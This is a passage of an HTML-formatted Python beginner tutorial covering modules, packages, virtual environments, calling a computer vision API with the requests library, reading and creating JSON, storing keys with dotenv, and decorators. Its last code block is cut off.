class="headerlink" title="11、Modules and packages"></a>11、Modules and packages</h3><h4 id="1）Modules"><a href="#1）Modules" class="headerlink" title="1）Modules"></a>1）Modules</h4><ul><li><p><strong>What’s a module?</strong></p><ul><li>A python file with functions, classes and other components</li></ul></li><li><p><strong>Why use module?</strong></p><ul><li>Break code down into reusable structures</li></ul></li></ul><p><strong>Creating a module</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># helpers.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">message, is_warning=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">if</span> is_warning:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Warning!!&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><p><strong>Import a module</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import module as namespace</span><br><span class="hljs-keyword">import</span> helpers<br>helpers.display(<span class="hljs-string">&#x27;Not a warning&#x27;</span>)<br><br><span class="hljs-comment"># import all into current namespace</span><br><span class="hljs-keyword">from</span> helpers <span class="hljs-keyword">import</span> *<br>display(<span class="hljs-string">&#x27;Not a warning&#x27;</span>)<br><br><span class="hljs-comment"># import specific items into current namespace</span><br><span class="hljs-keyword">from</span> helpers <span class="hljs-keyword">import</span> display<br>display(<span class="hljs-string">&#x27;Not a warning&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="2）Packages"><a href="#2）Packages" class="headerlink" title="2）Packages"></a>2）Packages</h4><ul><li><strong>What are packages?</strong><ul><li>Published collections of modules </li></ul></li><li>How do I find packages?<ul><li><a href="https://pypi.org/">Python Package Index</a></li><li>Internet search</li></ul></li></ul><p><strong>Installing packages</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Install an individual package</span><br>pip install colorama<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Install from a list of packages</span><br>pip install -r requirements.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> requirements.txt</span><br>colorama<br></code></pre></td></tr></table></figure><p><code>The best code in the world is the code that&#39;s already written</code></p><h4 id="3）Virtual-environments"><a href="#3）Virtual-environments" class="headerlink" title="3）Virtual environments"></a>3）Virtual environments</h4><ul><li><p><strong>By default, packages are installed globally</strong></p><ul><li>Version management becomes a challenge</li></ul></li><li><p><strong>Virtual environments can be used to contain and manage package collections</strong></p><ul><li>Really just a folder behind the scenes with all your packages</li></ul></li></ul><p><strong>Creating a virtual environments</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Install virtual environments</span><br>pip install virtualenv<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Windows systems</span><br>python -m venv &lt;folder_name&gt;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> OSX/Linux(bash)</span><br>virtualenv &lt;folder_name&gt;<br></code></pre></td></tr></table></figure><p><strong>Using virtual environments</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Windows systems</span><br><span class="hljs-meta">#</span><span class="bash"> cmd.exe</span><br>&lt;folder_name&gt;\Scripts\Activate.bat<br><span class="hljs-meta">#</span><span class="bash"> Powershell</span><br>&lt;folder_name&gt;\Scripts\Activate.ps1<br><span class="hljs-meta">#</span><span class="bash"> bash shell</span><br>. ./&lt;folder_name&gt;/Scripts/activate<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> OSX/Linux(bash)</span><br>&lt;folder_name&gt;/bin/activate<br></code></pre></td></tr></table></figure><p><strong>Installing packages in a virtual environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Install an individual package</span><br>pip install colorama<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Install from a list of packages</span><br>pip install -r requirements.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> requirements.txt</span><br>colorama<br></code></pre></td></tr></table></figure><p><strong>Importing packages</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import package as namespace</span><br><span class="hljs-keyword">import</span> colorama<br>colorama.init() <span class="hljs-comment"># Call required by colorama</span><br><span class="hljs-built_in">print</span>(colorama.Fore.RED + <span class="hljs-string">&#x27;This is red&#x27;</span>)<br><br><span class="hljs-comment"># import all components from module</span><br><span class="hljs-keyword">from</span> colorama <span class="hljs-keyword">import</span> *<br>init() <span class="hljs-comment"># Call required by colorama</span><br><span class="hljs-built_in">print</span>(Fore.BLUE + <span class="hljs-string">&#x27;This is blue&#x27;</span>)<br><br><span class="hljs-comment"># import specific components from module</span><br><span class="hljs-keyword">from</span> colorama <span class="hljs-keyword">import</span> init, Fore<br>init() <span class="hljs-comment"># Call required by colorama</span><br><span class="hljs-built_in">print</span>(Fore.GREEN + <span class="hljs-string">&#x27;This is green&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="12、Calling-an-API"><a href="#12、Calling-an-API" class="headerlink" title="12、Calling an API"></a>12、Calling an API</h3><p><strong>1）What is a web service?</strong></p><p>When a developer wants to share the functionality of a function but not the actual code in the program, they can place the function on a web server.</p><p>A programmer with the address of that function on the web server and the required permissions can call the function</p><p>This is called a web service</p><p><strong>2）What is an API?</strong></p><p>You can’t call a function unless you know the function name and the required parameters </p><p>When you create a web service you create an Application Programming Interface (API) </p><p>The API defines the function names and parameters so others know how to call your function.</p><p><strong>3）Keys allow me to track which users have permission to use my web service</strong></p><p>A developer signs up on my web site, or buys a license for my software and is provided a unique key</p><p>When the developer calls my web service they provide their unique key and I am able to verify the key has been approved for calls to my web service</p><p><strong>4）There is a standard for sending messages across the web</strong></p><p>Hypertext Transfer Protocol (HTTP) is a standard protocol for sending messages across the web</p><ul><li><p>GET</p><ul><li>Pass values in query string only</li><li>Special characters must be “escaped”</li><li>Limited amount of data</li></ul></li><li><p>POST</p><ul><li>Pass values in query string <strong>and</strong> body</li><li>No need to escape special characters if passed in body</li><li>Can pass large amounts of data, including images, in body</li></ul></li></ul><p><strong>5）The requests library simplifies HTTP calls from Python code</strong></p><p>requests.post(address, http_headers, function_parameters, message_body)</p><ul><li><p>address: request URL(contoso/analyze)</p></li><li><p>http_headers: request headers(content-type, API key)</p></li><li>function_parameters: request parameters(visualfeatures, details, language)</li><li>message_body: request body(image file)</li></ul><p><strong>6）Learning how to call APIs unlocks functionality from developers and software companies around the world API</strong> </p><p>parameters and keys requirements will vary </p><p>Refer to product and API documentation to learn how to call a specific API</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># This code will show you how to call the Computer Vision API from Python</span><br><span class="hljs-comment"># You can find documentation on the Computer Vision Analyze Image method here</span><br><span class="hljs-comment"># https://westus.dev.cognitive.microsoft.com/docs/services/5adf991815e1060e6355ad44/operations/56f91f2e778daf14a499e1fa</span><br><br><span class="hljs-comment"># Use the requests library to simplify making a REST API call from Python </span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># We will need the json library to read the data passed back by the web service</span><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># You need to update the SUBSCRIPTION_KEY to they key for your Computer Vision Service</span><br>SUBSCRIPTION_KEY = <span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><br><span class="hljs-comment"># You need to update the vision_service_address to the address of your Computer Vision Service</span><br>vision_service_address = <span class="hljs-string">&quot;https://canadacentral.api.cognitive.microsoft.com/vision/v2.0/&quot;</span><br><br><span class="hljs-comment"># Add the name of the function you want to call to the address</span><br>address = vision_service_address + <span class="hljs-string">&quot;analyze&quot;</span><br><br><span class="hljs-comment"># According to the documentation for the analyze image function </span><br><span class="hljs-comment"># There are three optional parameters: language, details &amp; visualFeatures</span><br>parameters  = &#123;<span class="hljs-string">&#x27;visualFeatures&#x27;</span>:<span class="hljs-string">&#x27;Description,Color&#x27;</span>,<br>               <span class="hljs-string">&#x27;language&#x27;</span>:<span class="hljs-string">&#x27;en&#x27;</span>&#125;<br><br><span class="hljs-comment"># Open the image file to get a file object containing the image to analyze</span><br>image_path = <span class="hljs-string">&quot;./TestImages/PolarBear.jpg&quot;</span><br>image_data = <span class="hljs-built_in">open</span>(image_path, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br><span class="hljs-comment"># According to the documentation for the analyze image function</span><br><span class="hljs-comment"># we need to specify the subscription key and the content type</span><br><span class="hljs-comment"># in the HTTP header. Content-Type is application/octet-stream when you pass in a image directly</span><br>headers    = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>,<br>              <span class="hljs-string">&#x27;Ocp-Apim-Subscription-Key&#x27;</span>: SUBSCRIPTION_KEY&#125;<br><br><span class="hljs-comment"># According to the documentation for the analyze image function</span><br><span class="hljs-comment"># we use HTTP POST to call this function</span><br>response = requests.post(address, headers=headers, params=parameters, data=image_data)<br><br><span class="hljs-comment"># Raise an exception if the call returns an error code</span><br>response.raise_for_status()<br><br><span class="hljs-comment"># Display the JSON results returned</span><br>results = response.json()<br><span class="hljs-built_in">print</span>(json.dumps(results))<br><br></code></pre></td></tr></table></figure><h3 id="13、JSON"><a href="#13、JSON" class="headerlink" title="13、JSON"></a>13、JSON</h3><p><strong>Many web services return data as JSON</strong></p><p>JSON is a standard data format that can be intimidating at first glance</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"># results<br>&#123;<span class="hljs-attr">&quot;color&quot;</span>: &#123;<span class="hljs-attr">&quot;dominantColorForeground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <span class="hljs-attr">&quot;dominantColorBackground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <span class="hljs-attr">&quot;dominantColors&quot;</span>: [<span class="hljs-string">&quot;White&quot;</span>], <span class="hljs-attr">&quot;accentColor&quot;</span>: <span class="hljs-string">&quot;595144&quot;</span>, <span class="hljs-attr">&quot;isBwImg&quot;</span>: <span class="hljs-literal">false</span>&#125;, <span class="hljs-attr">&quot;description&quot;</span>: &#123;<span class="hljs-attr">&quot;tags&quot;</span>: [<span class="hljs-string">&quot;bear&quot;</span>, <span class="hljs-string">&quot;polar&quot;</span>, <span class="hljs-string">&quot;animal&quot;</span>, <span class="hljs-string">&quot;mammal&quot;</span>, <span class="hljs-string">&quot;outdoor&quot;</span>, <span class="hljs-string">&quot;water&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;large&quot;</span>, <span class="hljs-string">&quot;walking&quot;</span>, <span class="hljs-string">&quot;snow&quot;</span>, <span class="hljs-string">&quot;standing&quot;</span>], <span class="hljs-attr">&quot;captions&quot;</span>: [&#123;<span class="hljs-attr">&quot;text&quot;</span>: <span class="hljs-string">&quot;a large white polar bear walking in the water&quot;</span>, <span class="hljs-attr">&quot;confidence&quot;</span>: <span class="hljs-number">0.7419737378283093</span>&#125;]&#125;, <span class="hljs-attr">&quot;requestId&quot;</span>: <span class="hljs-string">&quot;33290a37-ad67-42af-b647-c5a236ecd202&quot;</span>, <span class="hljs-attr">&quot;metadata&quot;</span>: &#123;<span class="hljs-attr">&quot;width&quot;</span>: <span class="hljs-number">220</span>, <span class="hljs-attr">&quot;height&quot;</span>: <span class="hljs-number">221</span>, <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;Jpeg&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><strong>Using a linting tool to format JSON makes it easier to read</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;color&quot;</span>:<br>           &#123;<span class="hljs-attr">&quot;dominantColorForeground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>,<br>            <span class="hljs-attr">&quot;dominantColorBackground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <br>            <span class="hljs-attr">&quot;dominantColors&quot;</span>: [<span class="hljs-string">&quot;White&quot;</span>], <br>            <span class="hljs-attr">&quot;accentColor&quot;</span>: <span class="hljs-string">&quot;595144&quot;</span>, <br>            <span class="hljs-attr">&quot;isBwImg&quot;</span>: <span class="hljs-literal">false</span>, <br>            <span class="hljs-attr">&quot;isBWImg&quot;</span>: <span class="hljs-literal">false</span>&#125;,<br>   <span class="hljs-attr">&quot;description&quot;</span>: <br>            &#123;<span class="hljs-attr">&quot;tags&quot;</span>: <br>      [<span class="hljs-string">&quot;bear&quot;</span>, <span class="hljs-string">&quot;polar&quot;</span>, <span class="hljs-string">&quot;animal&quot;</span>, <span class="hljs-string">&quot;mammal&quot;</span>, <span class="hljs-string">&quot;outdoor&quot;</span>, <span class="hljs-string">&quot;water&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;large&quot;</span>, <span class="hljs-string">&quot;walking&quot;</span>, <span class="hljs-string">&quot;snow&quot;</span>, <span class="hljs-string">&quot;standing&quot;</span>], <br>              <span class="hljs-attr">&quot;captions&quot;</span>: <br>                     [&#123;<span class="hljs-attr">&quot;text&quot;</span>: <span class="hljs-string">&quot;a large white polar bear walking in the water&quot;</span>,<br>        <span class="hljs-attr">&quot;confidence&quot;</span>: <span class="hljs-number">0.7419737378283093</span>&#125;]<br>             &#125;,<br>  <span class="hljs-attr">&quot;requestId&quot;</span>: <span class="hljs-string">&quot;33290a37-ad67-42af-b647-c5a236ecd202&quot;</span><br>  &#125;<br><br></code></pre></td></tr></table></figure><p><strong>JSON contains key pairs</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// &quot;key&quot;:&quot;value&quot;</span><br>&#123;<span class="hljs-attr">&quot;requestId&quot;</span>: <span class="hljs-string">&quot;33290a37-ad67-42af-b647-c5a236ecd202&quot;</span>&#125;<br><br><span class="hljs-comment">// &#123;&quot;key&quot;:&#123;&quot;subkey0&quot;:&quot;subvalue0&quot;,&quot;subkey1&quot;:&quot;subvalue1&quot;, …&#125;</span><br>&#123;<span class="hljs-attr">&quot;color&quot;</span>:<br> &#123;<span class="hljs-attr">&quot;dominantColorForeground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>,<br>  <span class="hljs-attr">&quot;dominantColorBackground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <br>  <span class="hljs-attr">&quot;dominantColors&quot;</span>: [<span class="hljs-string">&quot;White&quot;</span>], <br>  <span class="hljs-attr">&quot;accentColor&quot;</span>: <span class="hljs-string">&quot;595144&quot;</span>, <br>  <span class="hljs-attr">&quot;isBWImg&quot;</span>: <span class="hljs-literal">false</span>&#125;<br>&#125;<br><br><span class="hljs-comment">// &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, …]&#125;</span><br>&#123;<span class="hljs-attr">&quot;tags&quot;</span>: [<span class="hljs-string">&quot;bear&quot;</span>, <span class="hljs-string">&quot;polar&quot;</span>, <span class="hljs-string">&quot;animal&quot;</span>, <span class="hljs-string">&quot;mammal&quot;</span>, <span class="hljs-string">&quot;outdoor&quot;</span>, <span class="hljs-string">&quot;water&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;large&quot;</span>, <span class="hljs-string">&quot;walking&quot;</span>, <span class="hljs-string">&quot;snow&quot;</span>, <span class="hljs-string">&quot;standing&quot;</span>]&#125;<br><br></code></pre></td></tr></table></figure><p><strong>Reading JSON</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># To retrieve the value from a &quot;key&quot;:&quot;value&quot; request the key name</span><br><span class="hljs-built_in">print</span> (results[<span class="hljs-string">&#x27;requestId&#x27;</span>])<br><br><span class="hljs-comment"># To request a value from a &#123;&quot;key&quot;:&#123;&quot;subkey0&quot;:&quot;subvalue0&quot;,&quot;subkey1&quot;:&quot;subvalue1&quot;,…&#125; specify the key name and the subkey name</span><br><span class="hljs-built_in">print</span>(results[<span class="hljs-string">&#x27;color&#x27;</span>][<span class="hljs-string">&#x27;dominantColorBackground&#x27;</span>])<br><br><span class="hljs-comment"># To retrieve a value from a &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, …]&#125; specify the keyname and index position of the value to retrieve</span><br><span class="hljs-built_in">print</span>(results[<span class="hljs-string">&#x27;description&#x27;</span>][<span class="hljs-string">&#x27;tags&#x27;</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># Use a loop to retrieve all values from a &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, …]&#125;</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> results[<span class="hljs-string">&#x27;description&#x27;</span>][<span class="hljs-string">&#x27;tags&#x27;</span>]:<br>    <span class="hljs-built_in">print</span>(item)<br><br></code></pre></td></tr></table></figure><p><strong>Creating JSON</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># You can create &quot;key&quot;:&quot;value&quot; JSON objects from a dictionary</span><br><span class="hljs-comment"># Create a dictionary object</span><br>person_dict = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;last&#x27;</span>:<span class="hljs-string">&#x27;Harrison&#x27;</span>&#125;<br><span class="hljs-comment"># Add additional key pairs as needed to dictionary</span><br>person_dict[<span class="hljs-string">&#x27;City&#x27;</span>]=<span class="hljs-string">&#x27;Seattle&#x27;</span><br><br><span class="hljs-comment"># Convert dictionary to JSON object</span><br>person_json = json.dumps(person_dict)<br><span class="hljs-built_in">print</span>(person_json)<br><br><br><span class="hljs-comment"># Nest dictionaries to create JSON in the format &#123;&quot;key&quot;:&#123;&quot;subkey0&quot;:&quot;subvalue0&quot;,&quot;subkey1&quot;:&quot;subvalue1&quot;,…&#125;</span><br>person_dict = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;last&#x27;</span>:<span class="hljs-string">&#x27;Harrison&#x27;</span>&#125;<br><br><span class="hljs-comment"># Create staff dictionary which assigns a person to a role</span><br>staff_dict =&#123;&#125;<br>staff_dict[<span class="hljs-string">&#x27;Program Manager&#x27;</span>]=person_dict<br><br><span class="hljs-comment"># Convert dictionary to JSON object</span><br>staff_json = json.dumps(staff_dict)<br><span class="hljs-comment"># Print JSON object</span><br><span class="hljs-built_in">print</span>(staff_json)<br>                                                <br>                                                <br><span class="hljs-comment"># Add lists to the dictionary to create JSON in the format &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, …]&#125;</span><br>person_dict = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;last&#x27;</span>:<span class="hljs-string">&#x27;Harrison&#x27;</span>&#125;<br><br><span class="hljs-comment"># Create a list object of programming languages</span><br>languages_list = [<span class="hljs-string">&#x27;CSharp&#x27;</span>,<span class="hljs-string">&#x27;Python&#x27;</span>,<span class="hljs-string">&#x27;JavaScript&#x27;</span> ]<br><span class="hljs-comment"># Add list to dictionary</span><br>person_dict[<span class="hljs-string">&#x27;languages&#x27;</span>]= languages_list<br><br><span class="hljs-comment"># Convert dictionary to JSON object</span><br>person_json = json.dumps(person_dict)<br><span class="hljs-built_in">print</span>(person_json)<br><br></code></pre></td></tr></table></figure><p><strong>When creating and reading JSON</strong> </p><ul><li>Use print statements to help you debug</li><li>Use a JSON linting tool to make the JSON easier to read</li><li>Have a print out of the full JSON so you can figure out the structure when reading specific elements</li></ul><h3 id="14、Managing-keys"><a href="#14、Managing-keys" class="headerlink" title="14、Managing keys"></a>14、Managing keys</h3><p><strong>Values from outside of your application</strong></p><ul><li>Connecting to a database</li><li>Determining the operating system</li><li>Settings which need to change</li><li>Sensitive data</li></ul><p><strong>Reading an environmental variable</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Reading an environmental variable</span><br><span class="hljs-keyword">import</span> os<br>os_version = os.getenv(<span class="hljs-string">&#x27;OS&#x27;</span>)<br><span class="hljs-built_in">print</span>(os_version)<br></code></pre></td></tr></table></figure><p><strong>Using dotenv</strong></p><p>Store environmental variables in text file</p><ul><li>Don’t hard code</li><li>Don’t check sensitive values into source control</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pip install python-dotenv</span><br><br><span class="hljs-comment"># .env</span><br>DATABASE=Sample_Connection_String<br><br><span class="hljs-comment"># .gitignore</span><br>.env<br><br><span class="hljs-comment"># app.py</span><br><span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv<br>load_dotenv()<br><br><span class="hljs-keyword">import</span> os<br>database = os.getenv(<span class="hljs-string">&#x27;DATABASE&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(database)<br></code></pre></td></tr></table></figure><p><strong>Final notes</strong></p><ul><li><p>Don’t hard code sensitive information ever</p></li><li><p>Use dotenv for a simple solution</p><ul><li>Add .env to .gitignore</li></ul></li><li><p>Consider full encryption options</p><ul><li>Azure Key Vault</li></ul></li></ul><h3 id="15、Decorators"><a href="#15、Decorators" class="headerlink" title="15、Decorators"></a>15、Decorators</h3><p>The big thing really is in using Decorators that are part of a framework, such as Flash, that you’re going to be creating your application using </p><p><strong>Programming components</strong></p><ul><li>Objects<ul><li>Nouns</li><li>Data constructs</li></ul></li><li>Functions/Methods<ul><li>Verbs</li><li>Actions</li></ul></li><li>Decorators<ul><li>Adjectives</li><li>Add additional functionality to code</li><li>Common in framework</li><li>Django, Flask</li></ul></li></ul><p><strong>Using a decorator</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Snippet from Flask</span><br><span class="hljs-comment"># register https://myserver/api/products</span><br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;api/products&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_products</span>:</span><br>    <span class="hljs-comment"># code to list from database</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>Creating a decorator</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logger</span>(<span class="hljs-params">func</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>():</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Lodding execution&#x27;</span>)<br>        func()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Done logging&#x27;</span>)<br>    <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@logger</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sample</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Inside sample function&#x27;</span>)<br><br>sample()<br></code></pre></td></tr></table></figure><p><strong>Decorators code</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">from</span> colorama <span class="hljs-keyword">import</span> init, Fore<br>init()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span 